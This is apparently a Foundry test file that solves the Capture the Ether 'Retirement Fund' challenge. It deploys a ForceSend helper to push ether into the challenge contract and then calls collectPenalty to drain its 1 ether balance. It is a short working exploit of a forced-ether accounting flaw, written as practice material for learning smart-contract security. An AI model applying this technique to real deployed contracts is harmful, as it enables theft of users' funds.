// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {ForceSend} from "../../src/math/helpers/ForceSend.sol";

interface IRetirementFundChallenge {
    function isComplete() external view returns (bool);

    function collectPenalty() external;
}

contract TestRetirementFundChallenge is Test {
    IRetirementFundChallenge challenge;
    ForceSend attack;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    function setUp() external {
        vm.deal(deployer, 1 ether);
        vm.deal(player, 0.01 ether);

        vm.prank(deployer);

        address challengeAddress = deployCode(
            "RetirementFundChallenge.sol:RetirementFundChallenge",
            abi.encode(player),
            1 ether
        );

        challenge = IRetirementFundChallenge(challengeAddress);
    }

    function test_Solution() external {
        vm.startPrank(player);
        console.log(challenge.isComplete());
        attack = new ForceSend{value: 0.01 ether}(address(challenge));

        challenge.collectPenalty();
        vm.stopPrank();

        assert(challenge.isComplete());
    }
}
